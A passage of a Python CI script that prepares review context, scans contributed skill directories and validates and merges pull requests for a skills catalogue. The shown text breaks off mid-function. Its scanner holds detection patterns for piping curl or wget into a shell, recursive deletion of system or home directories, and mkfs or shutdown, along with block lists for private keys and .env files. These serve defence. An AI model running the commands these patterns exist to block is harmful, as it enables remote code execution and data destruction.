#!/usr/bin/env python3
"""为 Owner 指令准备审查上下文，并执行受约束的仓库操作。"""

import argparse
import hashlib
import importlib.util
import json
import os
import re
import shutil
import subprocess
import tempfile
import time
from pathlib import Path
from urllib.parse import urlsplit


ROOT = Path(__file__).resolve().parents[2]
PREFIX_PATTERN = re.compile(r"^/codex(?:\s|$)")
GITHUB_REPOSITORY_PATTERN = re.compile(
    r"https://github\.com/[A-Za-z0-9_.-]+/[A-Za-z0-9_.-]+"
)
ALLOWED_PR_PATHS = {"skills.json", "README.md"}
SYNC_BRANCH = "automation/sync-skills"
COLLECTION_BRANCH_PATTERN = re.compile(r"^codex/issue-(\d+)-\d+$")
REVIEW_LABEL = "codex-review"
BLOCKED_FILE_NAMES = {".env", "id_dsa", "id_ed25519", "id_rsa"}
BLOCKED_FILE_SUFFIXES = {".key", ".p12", ".pfx"}
BLOCKED_EXECUTABLE_SUFFIXES = {".bin", ".dll", ".dylib", ".exe", ".so"}
DANGEROUS_CODE = (
    (re.compile(r"\b(?:curl|wget)\b[^\n|]{0,300}\|\s*(?:ba|z)?sh\b"), "下载内容后直接交给 Shell 执行"),
    (re.compile(r"\brm\s+-[^\n]*r[^\n]*f\s+(?:/|~|\$HOME)"), "递归删除系统或用户目录"),
    (re.compile(r"\b(?:mkfs|shutdown|reboot)\b"), "执行高风险系统命令"),
)


def _run(command, *, cwd=ROOT, env=None, capture=False, timeout=None, check=True):
    """执行确定性命令，并在失败时保留原始错误。"""
    return subprocess.run(
        command,
        cwd=cwd,
        env=env,
        check=check,
        capture_output=capture,
        text=True,
        timeout=timeout,
    )


def _format_error(error):
    """提取可公开的错误详情，并格式化为 Markdown 引用。"""
    if isinstance(error, subprocess.CalledProcessError):
        details = (error.stderr or error.stdout or "").strip()
        if not details:
            details = f"命令执行失败（退出码 {error.returncode}）"
    else:
        details = str(error).strip() or error.__class__.__name__
    return "\n".join(f"> {line}" for line in details.splitlines())


def _gh_json(endpoint, *, method="GET", fields=None):
    """调用 GitHub CLI，并返回 JSON 结果。"""
    command = ["gh", "api", endpoint]
    input_text = None
    if method != "GET":
        command.extend(["--method", method, "--input", "-"])
        input_text = json.dumps(fields or {}, ensure_ascii=False)
    result = subprocess.run(
        command,
        cwd=ROOT,
        check=True,
        capture_output=True,
        text=True,
        input=input_text,
    )
    return json.loads(result.stdout) if result.stdout.strip() else None


def _pull_files(repository, pr_number):
    """分页读取 PR 的全部变更文件。"""
    result = _run(
        [
            "gh", "api", "--paginate", "--slurp",
            f"repos/{repository}/pulls/{pr_number}/files?per_page=100",
        ],
        capture=True,
    )
    return [item for page in json.loads(result.stdout) for item in page]


def _publish_review_status(repository, sha):
    """为已完成确定性校验的 PR Head 发布合并门禁状态。"""
    _gh_json(
        f"repos/{repository}/statuses/{sha}",
        method="POST",
        fields={
            "state": "success",
            "context": REVIEW_LABEL,
            "description": "Codex review and deterministic validation passed",
        },
    )


def _delete_branch_if_exists(repository, branch):
    """删除远端分支；GitHub 已自动删除时保持幂等。"""
    command = [
        "gh", "api", f"repos/{repository}/git/refs/heads/{branch}",
        "--method", "DELETE",
    ]
    result = _run(command, capture=True, check=False)
    details = f"{result.stdout}\n{result.stderr}"
    if _branch_delete_failed(result.returncode, details):
        raise subprocess.CalledProcessError(
            result.returncode,
            command,
            output=result.stdout,
            stderr=result.stderr,
        )


def _branch_delete_failed(returncode, details):
    """判断远端分支删除结果是否需要中止合并收尾。"""
    return returncode != 0 and "Reference does not exist" not in details


def _pull_is_behind_default(repository, pull):
    """判断 PR 源分支是否缺少默认分支的最新提交。"""
    default_sha = _gh_json(
        f"repos/{repository}/branches/{pull['base']['ref']}"
    )["commit"]["sha"]
    comparison = _gh_json(
        f"repos/{repository}/compare/{default_sha}...{pull['head']['sha']}"
    )
    return comparison["behind_by"] > 0


def _updated_head_is_base_merge(previous_sha, parent_shas, base_parent_behind):
    """确认更新提交只合并了原审查提交和默认分支历史。"""
    return (
        len(parent_shas) == 2
        and previous_sha in parent_shas
        and base_parent_behind == 0
    )


def _can_retry_merge(previous_pull, current_pull, behind_default):
    """仅在 Head 未变且只是默认分支前进时重试合并。"""
    return (
        current_pull["state"] == "open"
        and current_pull["head"]["sha"] == previous_pull["head"]["sha"]
        and behind_default
    )


def _review_checkout_matches(checkout_sha, api_sha, expected_sha):
    """确认拉取的 PR Head 与当前 API 及可选的锁定版本一致。"""
    return checkout_sha == api_sha and (
        expected_sha is None or checkout_sha == expected_sha
    )


def _collection_candidate(base_config, head_config, changed_paths):
    """提取收录 PR 唯一新增的 Skill 配置，并拒绝改写既有配置。"""
    base_sources = {item["name"]: item for item in base_config["skills"]}
    head_sources = {item["name"]: item for item in head_config["skills"]}
    changed_names = {
        name for name in base_sources.keys() & head_sources.keys()
        if base_sources[name] != head_sources[name]
    }
    removed_names = base_sources.keys() - head_sources.keys()
    added_names = head_sources.keys() - base_sources.keys()
    if changed_names or removed_names or len(added_names) != 1:
        raise ValueError("收录 PR 必须且只能新增一个 Skill 配置")

    name = next(iter(added_names))
    allowed_paths = {"README.md", "skills.json"}
    invalid_paths = sorted(
        path for path in changed_paths
        if path not in allowed_paths and not path.startswith(f"skills/{name}/")
    )
    if invalid_paths:
        raise ValueError(f"收录 PR 包含其他 Skill 变更：{', '.join(invalid_paths)}")
    return head_sources[name]


def _rebuild_collection_tree(checkout, previous_sha, merge_base_sha, changed_paths):
    """以最新默认分支为底，按原配置重新同步待收录 Skill。"""
    base_config = json.loads(
        _run(["git", "show", f"{merge_base_sha}:skills.json"], capture=True).stdout
    )
    head_config = json.loads(
        _run(["git", "show", f"{previous_sha}:skills.json"], capture=True).stdout
    )
    candidate = _collection_candidate(base_config, head_config, changed_paths)
    current_config_path = checkout / "skills.json"
    current_config = json.loads(current_config_path.read_text(encoding="utf-8"))
    if any(item["name"] == candidate["name"] for item in current_config["skills"]):
        raise ValueError(f"最新默认分支已包含 {candidate['name']}")

    current_config["skills"].append(candidate)
    current_config_path.write_text(
        json.dumps(current_config, ensure_ascii=False, indent=2) + "\n",
        encoding="utf-8",
    )
    sync = _load_sync_module(checkout)
    sync._main(candidate["name"])

    errors = validate_catalog(checkout)
    if errors:
        raise ValueError("；".join(errors))
    return candidate["name"]


def _rebuild_collection_branch(repository, pr_number, pull):
    """在更新分支发生内容冲突时重建受控收录分支。"""
    branch = pull["head"]["ref"]
    if not COLLECTION_BRANCH_PATTERN.fullmatch(branch):
        raise ValueError("只有受控收录分支可以自动重建冲突")

    previous_sha = pull["head"]["sha"]
    default_sha = _gh_json(
        f"repos/{repository}/branches/{pull['base']['ref']}"
    )["commit"]["sha"]
    files = _pull_files(repository, pr_number)
    changed_paths = {item["filename"] for item in files}
    _run([
        "git", "fetch", "--no-tags", "origin",
        f"refs/pull/{pr_number}/head", f"refs/heads/{pull['base']['ref']}",
    ])
    merge_base_sha = _run(
        ["git", "merge-base", previous_sha, default_sha], capture=True
    ).stdout.strip()

    with tempfile.TemporaryDirectory(prefix="codex-rebuild-") as directory:
        checkout = Path(directory) / "checkout"
        _run(["git", "worktree", "add", "--detach", str(checkout), default_sha])
        try:
            name = _rebuild_collection_tree(
                checkout, previous_sha, merge_base_sha, changed_paths
            )
            _run(
                ["git", "add", "--", "skills.json", "README.md", f"skills/{name}"],
                cwd=checkout,
            )
            _run(
                [
                    "git", "-c", "user.name=github-actions[bot]",
                    "-c", "user.email=41898282+github-actions[bot]@users.noreply.github.com",
                    "commit", "-m", f"feat(skills): 收录 {name}",
                ],
                cwd=checkout,
            )
            rebuilt_sha = _run(
                ["git", "rev-parse", "HEAD"], cwd=checkout, capture=True
            ).stdout.strip()
            _run(
                [
                    "git", "push",
                    f"--force-with-lease=refs/heads/{branch}:{previous_sha}",
                    "origin", f"HEAD:refs/heads/{branch}",
                ],
                cwd=checkout,
            )
        finally:
            _run(["git", "worktree", "remove", "--force", str(checkout)])

    for _ in range(30):
        current = _gh_json(f"repos/{repository}/pulls/{pr_number}")
        if current["head"]["sha"] == rebuilt_sha:
            return current
        if current["head"]["sha"] != previous_sha:
            raise ValueError("PR 在自动重建期间发生变化，请重新审查")
        time.sleep(2)
    raise TimeoutError("等待 GitHub 更新重建后的 PR 分支超时")


def _update_pull_branch(repository, pr_number, pull, *, rebuild_conflicts=False):
    """必要时把最新默认分支合入受控 PR，并等待 GitHub 完成更新。"""
    if not _pull_is_behind_default(repository, pull):
        return pull
    head_repository = (pull["head"].get("repo") or {}).get("full_name")
    if head_repository != repository:
        raise ValueError("PR 已落后默认分支，且源分支不在本仓库，无法自动更新")

    if pull.get("mergeable_state") == "dirty":
        if rebuild_conflicts:
            return _rebuild_collection_branch(repository, pr_number, pull)
        raise ValueError("PR 与最新默认分支冲突，请重新审查")

    previous_sha = pull["head"]["sha"]
    try:
        _gh_json(
            f"repos/{repository}/pulls/{pr_number}/update-branch",
            method="PUT",
            fields={"expected_head_sha": previous_sha},
        )
    except subprocess.CalledProcessError:
        current = _gh_json(f"repos/{repository}/pulls/{pr_number}")
        if rebuild_conflicts and current.get("mergeable_state") == "dirty":
            return _rebuild_collection_branch(repository, pr_number, current)
        raise
    for _ in range(30):
        current = _gh_json(f"repos/{repository}/pulls/{pr_number}")
        if current["head"]["sha"] != previous_sha:
            commit = _gh_json(
                f"repos/{repository}/git/commits/{current['head']['sha']}"
            )
            parents = [parent["sha"] for parent in commit["parents"]]
            base_parents = [sha for sha in parents if sha != previous_sha]
            base_parent_behind = 1
            if len(base_parents) == 1:
                default_sha = _gh_json(
                    f"repos/{repository}/branches/{pull['base']['ref']}"
                )["commit"]["sha"]
                base_parent_behind = _gh_json(
                    f"repos/{repository}/compare/{base_parents[0]}...{default_sha}"
                )["behind_by"]
            if not _updated_head_is_base_merge(
                previous_sha, parents, base_parent_behind
            ):
                raise ValueError("PR 更新后包含非默认分支内容，请重新审查")
            return current
        time.sleep(2)
    raise TimeoutError("等待 GitHub 更新 PR 分支超时")


def _validate_merge_candidate(repository, pr_number, pull):
    """对更新到最新基线的 PR 执行确定性目录与上游校验。"""
    files = _pull_files(repository, pr_number)
    changed_paths = {item["filename"] for item in files}
    invalid_paths = sorted(
        path for path in changed_paths
        if path not in ALLOWED_PR_PATHS and not path.startswith("skills/")
    )
    if invalid_paths:
        raise ValueError(f"收录 PR 包含越界文件：{', '.join(invalid_paths)}")

    base_sha = _gh_json(
        f"repos/{repository}/branches/{pull['base']['ref']}"
    )["commit"]["sha"]
    _run([
        "git", "fetch", "--no-tags", "origin",
        f"refs/pull/{pr_number}/head", f"refs/heads/{pull['base']['ref']}",
    ])
    with tempfile.TemporaryDirectory(prefix="codex-pr-") as directory:
        checkout = Path(directory) / "checkout"
        _run([
            "git", "worktree", "add", "--detach", str(checkout),
            pull["head"]["sha"],
        ])
        try:
            errors = validate_catalog(checkout)
            base_config = json.loads(
                _run(
                    ["git", "show", f"{base_sha}:skills.json"],
                    capture=True,
                ).stdout
            )
            head_config = json.loads((checkout / "skills.json").read_text(encoding="utf-8"))
            base_sources = {item["name"]: item for item in base_config["skills"]}
            head_sources = {item["name"]: item for item in head_config["skills"]}
            affected_names = {
                name for name in base_sources.keys() | head_sources.keys()
                if base_sources.get(name) != head_sources.get(name)
            }
            affected_names.update(
                path.split("/", 2)[1]
                for path in changed_paths
                if path.startswith("skills/") and len(path.split("/", 2)) > 1
            )
            errors.extend(verify_upstreams(checkout, affected_names))
        finally:
            _run(["git", "worktree", "remove", "--force", str(checkout)])
    if errors:
        raise ValueError("；".join(errors))
    _run(["python3", ".github/scripts/sync_skills.py", "--self-check"])


def _load_sync_module(root):
    """加载现有同步脚本，并把路径绑定到待验证仓库。"""
    script_path = ROOT / ".github/scripts/sync_skills.py"
    spec = importlib.util.spec_from_file_location("skills_hub_sync", script_path)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    module.ROOT = root
    module.CONFIG_PATH = root / "skills.json"
    module.README_PATH = root / "README.md"
    module.SKILLS_PATH = root / "skills"
    return module


def _merge_cleanup_target(repository, pull):
    """返回 Codex 合并后可删除的本仓库分支及其收录 Issue。"""
    branch = pull["head"]["ref"]
    head_repository = (pull["head"].get("repo") or {}).get("full_name")
    if head_repository != repository or branch == pull["base"]["ref"]:
        return None
    collection = COLLECTION_BRANCH_PATTERN.fullmatch(branch)
    issue_number = int(collection.group(1)) if collection else None
    return branch, issue_number


def _inside(path, root):
    """判断解析后的路径是否仍位于指定目录。"""
    try:
        path.resolve(strict=False).relative_to(root.resolve())
        return True
    except ValueError:
        return False


def scan_skill_tree(root):
    """静态扫描 Skill 文件，不执行其中任何代码。"""
    findings = []
    total_size = 0
    file_count = 0
    if not root.is_dir():
        return [{"level": "error", "path": str(root), "reason": "目录不存在"}]

    for path in root.rglob("*"):
        relative = path.relative_to(root).as_posix()
        if ".git" in path.parts:
            continue
        if path.is_symlink():
            if not _inside(path, root):
                findings.append(
                    {"level": "error", "path": relative, "reason": "符号链接指向目录外"}
                )
            continue
        if not path.is_file():
            continue

        file_count += 1
        size = path.stat().st_size
        total_size += size
        if (
            path.name in BLOCKED_FILE_NAMES
            or path.name.startswith(".env.")
            or path.suffix.lower() in BLOCKED_FILE_SUFFIXES
        ):
            findings.append(
                {"level": "error", "path": relative, "reason": "包含凭据或私钥类文件"}
            )
        if path.suffix.lower() in BLOCKED_EXECUTABLE_SUFFIXES:
            findings.append(
                {"level": "error", "path": relative, "reason": "包含未经审查的可执行二进制文件"}
            )
        if size > 50 * 1024 * 1024:
            findings.append(
                {"level": "error", "path": relative, "reason": "单个文件超过 50 MiB"}
            )
        if size > 1024 * 1024:
            continue
        try:
            content = path.read_text(encoding="utf-8")
        except UnicodeDecodeError:
            continue
        for pattern, reason in DANGEROUS_CODE:
            if pattern.search(content):
                findings.append({"level": "error", "path": relative, "reason": reason})

    if total_size > 200 * 1024 * 1024:
        findings.append(
            {"level": "error", "path": ".", "reason": "目录总大小超过 200 MiB"}
        )
    if file_count > 5000:
        findings.append({"level": "error", "path": ".", "reason": "文件数量超过 5000"})
    return findings


def validate_catalog(root):
    """验证目录、配置、描述、README 和静态安全约束。"""
    errors = []
    sync = _load_sync_module(root)
    try:
        sources = sync._load_sources()
    except (OSError, ValueError, json.JSONDecodeError) as error:
        return [str(error)]

    locations = set()
    for source in sources:
        location = (source["repository"], source["path"])
        if location in locations:
            errors.append(f"重复的上游位置：{source['repository']}#{source['path']}")
        locations.add(location)

        description = source["description"]
        if not 12 <= len(description) <= 120:
            errors.append(f"{source['name']} 的用途说明应为 12–120 个字符")
        if not re.search(r"[\u4e00-\u9fff]", description):
            errors.append(f"{source['name']} 的用途说明必须使用中文")
        if "\n" in description or re.search(r"https?://|\[[^]]+\]\(", description):
            errors.append(f"{source['name']} 的用途说明必须是纯文本单行")
        if description.endswith(("。", ".", "！", "!", "？", "?", "；", ";")):
            errors.append(f"{source['name']} 的用途说明末尾不加标点")

    skills_path = root / "skills"
    expected_names = {source["name"] for source in sources}
    actual_names = (
        {path.name for path in skills_path.iterdir() if path.is_dir() and not path.name.startswith(".")}
        if skills_path.is_dir()
        else set()
    )
    for name in sorted(expected_names - actual_names):
        errors.append(f"缺少 Skill 目录：skills/{name}")
    for name in sorted(actual_names - expected_names):
        errors.append(f"未在 skills.json 登记的目录：skills/{name}")

    for name in sorted(expected_names & actual_names):
        if (skills_path / name).is_symlink():
            errors.append(f"skills/{name} 不能是符号链接目录")
            continue
        skill_file = skills_path / name / "SKILL.md"
        if not skill_file.is_file() or skill_file.is_symlink():
            errors.append(f"skills/{name} 缺少真实的 SKILL.md")
        for finding in scan_skill_tree(skills_path / name):
            if finding["level"] == "error":
                errors.append(f"skills/{name}/{finding['path']}：{finding['reason']}")

    try:
        readme = (root / "README.md").read_text(encoding="utf-8")
        update_times = sync._load_update_times(readme)
        for source in sources:
            updated_at = update_times.get(source["name"])
            if not updated_at or not re.fullmatch(r"\d{4}-\d{2}-\d{2} \d{2}:\d{2}", updated_at):
                errors.append(f"{source['name']} 缺少有效的同步时间")
        rendered = sync._render_readme(
            readme, sources, update_times
        )
        if rendered != readme:
            errors.append("README 技能清单与 skills.json 不一致，请运行同步脚本")
    except (OSError, ValueError) as error:
        errors.append(str(error))
    return errors


def _tree_manifest(root):
    """生成目录内容清单，用于确认同步文件与上游完全一致。"""
    manifest = {}
    for path in sorted(root.rglob("*")):
        if ".git" in path.parts:
            continue
        relative = path.relative_to(root).as_posix()
        if path.is_symlink():
            manifest[relative] = ("link", os.readlink(path))
        elif path.is_dir():
            continue
        elif path.is_file():
            digest = hashlib.sha256()
            with path.open("rb") as file:
                for chunk in iter(lambda: file.read(1024 * 1024), b""):
                    digest.update(chunk)
            manifest[relative] = ("file", digest.hexdigest())
    return manifest


def verify_upstreams(root, skill_names):
    """重新克隆受影响上游，验证待合并目录确为同步结果。"""
    sync = _load_sync_module(root)
    sources = {source["name"]: source for source in sync._load_sources()}
    errors = []
    safe_env = os.environ.copy()
    safe_env.pop("GH_TOKEN", None)
    safe_env.pop("GITHUB_TOKEN", None)
    with tempfile.TemporaryDirectory(prefix="codex-upstream-") as directory:
        temporary_root = Path(directory)
        for index, name in enumerate(sorted(skill_names)):
            source = sources.get(name)
            if source is None:
                errors.append(f"{name} 已从 skills.json 删除，收录管家不处理删除")
                continue
            clone = temporary_root / f"repo-{index}"
            expected = temporary_root / f"expected-{index}"
            try:
                _run(
                    [
                        "git", "clone", "--depth", "1", "--no-recurse-submodules",
                        source["repository"], str(clone),
                    ],
                    env=safe_env,
                    timeout=120,
                )
            except (subprocess.CalledProcessError, subprocess.TimeoutExpired):
                errors.append(f"{name} 的上游仓库无法克隆")
                continue
            source_path = clone / source["path"]
            if source_path.is_symlink() or not (source_path / "SKILL.md").is_file():
                errors.append(f"{name} 的上游路径缺少 SKILL.md")
                continue
            shutil.copytree(
                source_path,
                expected,
                ignore=shutil.ignore_patterns(".git"),
                symlinks=True,
            )
            license_path = clone / "LICENSE"
            if (
                source["path"] != "."
                and license_path.is_file()
                and not (expected / "LICENSE").exists()
            ):
                shutil.copy2(license_path, expected / "LICENSE")
            if _tree_manifest(expected) != _tree_manifest(root / "skills" / name):
                errors.append(f"skills/{name} 与当前上游内容不一致")
    return errors


def _repository_urls(texts, current_repository):
    """从不可信文本中提取并规范化 GitHub 仓库根地址。"""
    urls = []
    for text in texts:
        for match in GITHUB_REPOSITORY_PATTERN.findall(text or ""):
            parsed = urlsplit(match.rstrip("./"))
            parts = [part for part in parsed.path.split("/") if part]
            if len(parts) < 2:
                continue
            url = f"https://github.com/{parts[0]}/{parts[1].removesuffix('.git')}"
            if url.lower() == f"https://github.com/{current_repository}".lower():
                continue
            if url not in urls:
                urls.append(url)
    return urls[:3]


def _owner_instruction(event):
    """把评论或 Issue 收录标签转换为统一的 Owner 指令。"""
    comment = event.get("comment")
    if comment is not None:
        return comment.get("body", "")
    if (
        event.get("action") == "labeled"
        and event.get("label", {}).get("name") == REVIEW_LABEL
        and "pull_request" not in event.get("issue", {})
    ):
        return "/codex 审查并创建 PR"
    return ""


def prepare_context(event_path, output_directory, expected_head_sha=None):
    """获取 Issue/PR 上下文、相关条目和候选上游的静态扫描结果。"""
    event = json.loads(event_path.read_text(encoding="utf-8"))
    repository = event["repository"]["full_name"]
    issue_number = event["issue"]["number"]
    instruction = _owner_instruction(event)
    output_directory.mkdir(parents=True, exist_ok=True)

    issue = _gh_json(f"repos/{repository}/issues/{issue_number}")
    comments = _gh_json(
        f"repos/{repository}/issues/{issue_number}/comments?per_page=100"
    )
    repository_issues = _gh_json(
        f"repos/{repository}/issues?state=all&per_page=100"
    )
    repository_pulls = _gh_json(
        f"repos/{repository}/pulls?state=all&per_page=100"
    )
    pull_request = None
    pull_files = []
    if "pull_request" in issue:
        pull_request = _gh_json(f"repos/{repository}/pulls/{issue_number}")
        pull_files = _pull_files(repository, issue_number)
        _run(["git", "fetch", "--no-tags", "origin", f"refs/pull/{issue_number}/head"])
        checkout_sha = _run(
            ["git", "rev-parse", "FETCH_HEAD"], capture=True
        ).stdout.strip()
        if not _review_checkout_matches(
            checkout_sha, pull_request["head"]["sha"], expected_head_sha
        ):
            raise ValueError("PR 在准备审查上下文时发生变化，请重新执行审查")
        pull_checkout = output_directory / "pull-request"
        _run([
            "git", "worktree", "add", "--detach", str(pull_checkout), checkout_sha,
        ])
        pull_request["checkout_path"] = str(pull_checkout)
        pull_request["checkout_sha"] = checkout_sha

    texts = [issue.get("title"), issue.get("body"), instruction]
    texts.extend(comment.get("body") for comment in comments)
    texts.extend(file.get("patch") for file in pull_files)
    upstreams = []
    upstream_root = output_directory / "upstreams"
    upstream_root.mkdir()
    clone_env = os.environ.copy()
    clone_env.pop("GH_TOKEN", None)
    clone_env.pop("GITHUB_TOKEN", None)
    for index, repository_url in enumerate(_repository_urls(texts, repository)):
        target = upstream_root / str(index)
        record = {"repository": repository_url, "path": str(target), "clone_error": None}
        try:
            _run(
                [
                    "git",
                    "clone",
                    "--depth",
                    "1",
                    "--filter=blob:limit=2m",
                    "--no-recurse-submodules",
                    repository_url,
                    str(target),
                ],
                env=clone_env,
                timeout=120,
            )
            shutil.rmtree(target / ".git", ignore_errors=True)
            record["static_findings"] = scan_skill_tree(target)
        except (subprocess.CalledProcessError, subprocess.TimeoutExpired) as error:
            record["clone_error"] = str(error)
        upstreams.append(record)

    context = {
        "instruction": instruction,
        "issue": issue,
        "comments": comments,
        "pull_request": pull_request,
        "pull_files": pull_files,
        "repository_issues": [
            item for item in repository_issues if "pull_request" not in item
        ],
        "repository_pulls": repository_pulls,
        "upstreams": upstreams,
    }
    (output_directory / "context.json").write_text(
        json.dumps(context, ensure_ascii=False, indent=2), encoding="utf-8"
    )


def prepare_review_context(
    repository, pr_number, output_directory, expected_head_sha
):
    """为指定 Skill 变更 PR 生成只读审查上下文。"""
    event = {
        "repository": {"full_name": repository},
        "issue": {"number": pr_number},
        "comment": {"body": "自动审查 Skill 变更 PR"},
    }
    with tempfile.NamedTemporaryFile("w", encoding="utf-8") as file:
        json.dump(event, file, ensure_ascii=False)
        file.flush()
        prepare_context(Path(file.name), output_directory, expected_head_sha)


def _post_comment(repository, number, body):
    """把模型结论作为数据发布到当前 Issue 或 PR。"""
    with tempfile.NamedTemporaryFile("w", encoding="utf-8", delete=False) as file:
        file.write(body[:30000])
        comment_path = file.name
    try:
        _run(["gh", "issue", "comment", str(number), "--repo", repository, "--body-file", comment_path])
    finally:
        Path(comment_path).unlink(missing_ok=True)


def _blocked_comment(owner, body):
    """仅在自动审查受阻时提醒仓库 Owner 决策。"""
    return f"@{owner}\n\n{body.rstrip()}"


def _steward_comment(event, result, owner):
    """在 Issue 结论需要修改或等待时提醒仓库 Owner。"""
    body = result["comment"]
    if (
        "pull_request" not in event["issue"]
        and result.get("recommendation") in {"request_changes", "wait_for_pr"}
    ):
        return _blocked_comment(owner, body)
    return body


def _validate_candidate(candidate):
    """限制模型只能提供 skills.json 已有字段。"""
    required = {"name", "category", "repository", "path", "description"}
    if not isinstance(candidate, dict) or set(candidate) != required:
        raise ValueError("创建 PR 时缺少完整的 Skill 配置")
    if not all(isinstance(value, str) for value in candidate.values()):
        raise ValueError("Skill 配置字段必须是字符串")
    return candidate


def _create_pr(event, result):
    """从审查结果生成配置、同步文件并创建 PR。"""
    if "pull_request" in event["issue"]:
        raise ValueError("请在 Issue 中创建新的收录 PR")
    candidate = _validate_candidate(result["candidate"])
    config_path = ROOT / "skills.json"
    config = json.loads(config_path.read_text(encoding="utf-8"))
    config["skills"].append(candidate)
    config_path.write_text(
        json.dumps(config, ensure_ascii=False, indent=2) + "\n", encoding="utf-8"
    )
    _load_sync_module(ROOT)._load_sources()

    safe_env = os.environ.copy()
    safe_env.pop("GH_TOKEN", None)
    safe_env.pop("GITHUB_TOKEN", None)
    _run(
        [
            "python3",
            ".github/scripts/sync_skills.py",
            "--skill",
            candidate["name"],
        ],
        env=safe_env,
    )
    errors = validate_catalog(ROOT)
    if errors:
        raise ValueError("；".join(errors))

    issue_number = event["issue"]["number"]
    title = f"feat(skills): 收录 {candidate['name']}"
    branch = f"codex/issue-{issue_number}-{os.environ['GITHUB_RUN_ID']}"
    _run(["git", "switch", "-c", branch])
    _run(
        [
            "git",
            "add",
            "--",
            "skills.json",
            "README.md",
            f"skills/{candidate['name']}",
        ]
    )
    if _run(["git", "diff", "--cached", "--quiet"], check=False).returncode == 0:
        raise ValueError("没有可提交的收录变更")
    _run(["git", "config", "user.name", "github-actions[bot]"])
    _run(["git", "config", "user.email", "41898282+github-actions[bot]@users.noreply.github.com"])
    _run(["git", "commit", "-m", title])
    _run(["git", "push", "origin", branch])

    repository = event["repository"]["full_name"]
    body = f"{result['comment'].rstrip()}\n\n---\n\nCloses #{issue_number}"
    _run(
        [
            "gh", "label", "create", REVIEW_LABEL, "--repo", repository,
            "--color", "BFD4F2",
            "--description", "等待 Codex 审查的 Skill 变更",
            "--force",
        ]
    )
    created = _run(
        [
            "gh", "pr", "create", "--repo", repository,
            "--base", event["repository"]["default_branch"], "--head", branch,
            "--title", title, "--body", body, "--label", REVIEW_LABEL,
        ],
        capture=True,
    )
    pull = json.loads(
        _run(
            ["gh", "pr", "view", branch, "--repo", repository, "--json", "number"],
            capture=True,
        ).stdout
    )
    pr_number = pull.get("number")
    if not isinstance(pr_number, int) or pr_number < 1:
        raise ValueError("无法确认新建 PR 的编号")
    _post_comment(
        repository,
        issue_number,
        f"已创建 PR：{created.stdout.strip()}"
        "\n\n审查详情和后续修改请在 PR 中继续。",
    )
    return pr_number


def _merge_pr(event, result):
    """在可信脚本完成最终验证后，以 squash 方式合并 PR。"""
    repository = event["repository"]["full_name"]
    current_is_pr = "pull_request" in event["issue"]
    pr_number = event["issue"]["number"] if current_is_pr else result["pr_number"]
    if not isinstance(pr_number, int) or pr_number < 1:
        raise ValueError("没有找到要合并的 PR")
    pull = _gh_json(f"repos/{repository}/pulls/{pr_number}")
    if pull["state"] != "open":
        raise ValueError("PR 必须处于开放状态")
    if pull["base"]["ref"] != event["repository"]["default_branch"]:
        raise ValueError("只能合并到默认分支")
    expected_sha = result["expected_head_sha"]
    if expected_sha != pull["head"]["sha"]:
        raise ValueError("PR 在审查后发生变化，请重新执行 /codex review")

    for _ in range(3):
        pull = _update_pull_branch(repository, pr_number, pull)
        _validate_merge_candidate(repository, pr_number, pull)
        if _pull_is_behind_default(repository, pull):
            continue
        _publish_review_status(repository, pull["head"]["sha"])
        try:
            merged = _gh_json(
                f"repos/{repository}/pulls/{pr_number}/merge",
                method="PUT",
                fields={"merge_method": "squash", "sha": pull["head"]["sha"]},
            )
        except subprocess.CalledProcessError:
            current = _gh_json(f"repos/{repository}/pulls/{pr_number}")
            if _can_retry_merge(
                pull, current, _pull_is_behind_default(repository, current)
            ):
                pull = current
                continue
            raise
        if merged.get("merged"):
            break
        raise ValueError(merged.get("message", "GitHub 拒绝合并"))
    else:
        raise ValueError("默认分支持续变化，请稍后重新执行合并")

    cleanup = _merge_cleanup_target(repository, pull)
    cleanup_errors = []
    if cleanup:
        branch, issue_number = cleanup
        if issue_number is not None:
            try:
                _gh_json(
                    f"repos/{repository}/issues/{issue_number}",
                    method="PATCH",
                    fields={"state": "closed", "state_reason": "completed"},
                )
            except Exception as error:
                cleanup_errors.append(f"关闭 Issue #{issue_number} 失败：{error}")
        try:
            _delete_branch_if_exists(repository, branch)
        except Exception as error:
            cleanup_errors.append(f"删除分支 `{branch}` 失败：{error}")
    _post_comment(repository, event["issue"]["number"], result["comment"])
    if cleanup_errors:
        _post_comment(
            repository,
            event["issue"]["number"],
            "### 合并后收尾未完成\n\n- " + "\n- ".join(cleanup_errors),
        )


def _validate_automated_review(
    pull, repository, default_branch, pr_number, result, changed_paths
):
    """确认模型结论只作用于受控的 Skill 变更 PR。"""
    action = result.get("action")
    expected_recommendation = {"merge": "merge", "comment": "request_changes"}
    if action not in expected_recommendation:
        raise ValueError("自动审查只能批准合并或提出修改意见")
    if result.get("recommendation") != expected_recommendation[action]:
        raise ValueError("自动审查结论与建议不一致")
    if result.get("pr_number") != pr_number:
        raise ValueError("Codex 返回的 PR 编号与当前 PR 不一致")
    if pull.get("state") != "open":
        raise ValueError("PR 必须处于开放状态")
    if pull.get("base", {}).get("ref") != default_branch:
        raise ValueError("PR 必须合并到默认分支")
    if pull.get("user", {}).get("login") != "github-actions[bot]":
        raise ValueError("只能自动审查 GitHub Actions 创建的 PR")
    head = pull.get("head") or {}
    head_repository = head.get("repo") or {}
    if head_repository.get("full_name") != repository:
        raise ValueError("只能自动审查本仓库分支")
    branch = head.get("ref") or ""
    if branch == SYNC_BRANCH:
        invalid_paths = sorted(
            path
            for path in changed_paths
            if path != "README.md" and not path.startswith("skills/")
        )
    elif COLLECTION_BRANCH_PATTERN.fullmatch(branch):
        invalid_paths = sorted(
            path
            for path in changed_paths
            if path not in ALLOWED_PR_PATHS and not path.startswith("skills/")
        )
    else:
        raise ValueError("只能自动审查受控的收录或同步分支")
    if result.get("expected_head_sha") != head.get("sha"):
        raise ValueError("PR 在审查后发生变化，请重新审查")
    labels = {label.get("name") for label in pull.get("labels", [])}
    if REVIEW_LABEL not in labels:
        raise ValueError(f"PR 缺少 {REVIEW_LABEL} 标签")
    if invalid_paths:
        raise ValueError(f"PR 包含越界文件：{', '.join(invalid_paths)}")


def update_review_branch(repository, pr_number, github_output=None):
    """审查前把受控 PR 更新到最新默认分支，冲突时提醒 Owner。"""
    owner = repository.split("/", 1)[0]
    try:
        repository_data = _gh_json(f"repos/{repository}")
        owner = repository_data["owner"]["login"]
        pull = _gh_json(f"repos/{repository}/pulls/{pr_number}")
        files = _pull_files(repository, pr_number)
        result = {
            "action": "merge",
            "recommendation": "merge",
            "pr_number": pr_number,
